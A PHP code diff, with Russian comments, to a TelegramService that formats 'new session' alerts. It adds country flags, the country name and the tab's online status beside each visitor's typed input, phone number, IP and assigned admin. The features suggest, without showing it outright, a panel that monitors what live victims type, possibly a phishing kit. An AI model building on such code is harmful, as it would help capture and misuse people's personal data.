@@ -553,12 +553,29 @@ class TelegramService
         $inputEmoji = $session->input_type->emoji();
         $inputLabel = $session->input_type->label();
 
+        // Флаг страны + название
+        $countryFlag = $session->country_code ? $this->countryCodeToFlag($session->country_code) : '';
+        $countryInfo = $countryFlag;
+        if ($session->country_name) {
+            $countryInfo .= " {$session->country_name}";
+        }
+
+        // Онлайн статус вкладки
+        $onlineStatus = $session->is_online ? '🟢 Онлайн' : '🔴 Оффлайн';
+
+        // Формируем строку ввода (с флагом если телефон)
+        $inputLine = "{$inputEmoji} {$inputLabel}: <code>{$session->input_value}</code>";
+        if ($session->input_type->value === 'phone' && $countryFlag) {
+            $inputLine = "{$countryFlag} {$inputLabel}: <code>{$session->input_value}</code>";
+        }
+
         $lines = [
             "📋 <b>Новая сессия</b>",
             "",
-            "{$inputEmoji} {$inputLabel}: <code>{$session->input_value}</code>",
-            "🌐 IP: <code>{$session->ip}</code>",
+            $inputLine,
+            "🌐 IP: <code>{$session->ip}</code>" . ($countryInfo ? " | {$countryInfo}" : ''),
             "{$statusEmoji} Статус: {$statusLabel}",
+            "👁 Вкладка: {$onlineStatus}",
         ];
 
         // Добавляем информацию об админе
@@ -610,9 +627,10 @@ class TelegramService
             }
         }
 
-        // Добавляем телефон, если есть
+        // Добавляем телефон, если есть (с флагом страны)
         if ($session->phone_number && $session->input_type->value !== 'phone') {
-            $lines[] = "📞 Телефон: <code>{$session->phone_number}</code>";
+            $phoneFlag = $countryFlag ?: '📞';
+            $lines[] = "{$phoneFlag} Телефон: <code>{$session->phone_number}</code>";
         }
 
         // Кастомная ошибка
@@ -842,5 +860,28 @@ class TelegramService
         $text .= "\n\n🔗 <code>{$pageUrl}</code>";
 
         return $this->sendSessionUpdate($session, $text);
+    }
+
+    /**
+     * Конвертация 2-буквенного кода страны (ISO 3166-1 alpha-2) в эмодзи флага
+     * Например: 'BE' → 🇧🇪, 'NL' → 🇳🇱
+     */
+    private function countryCodeToFlag(string $code): string
+    {
+        $code = strtoupper($code);
+        if (strlen($code) !== 2) {
+            return '🌍';
+        }
+
+        $flag = '';
+        for ($i = 0; $i < 2; $i++) {
+            $char = ord($code[$i]);
+            if ($char < ord('A') || $char > ord('Z')) {
+                return '🌍';
+            }
+            $flag .= mb_chr(0x1F1E6 + $char - ord('A'));
+        }
+
+        return $flag;
     }
 }
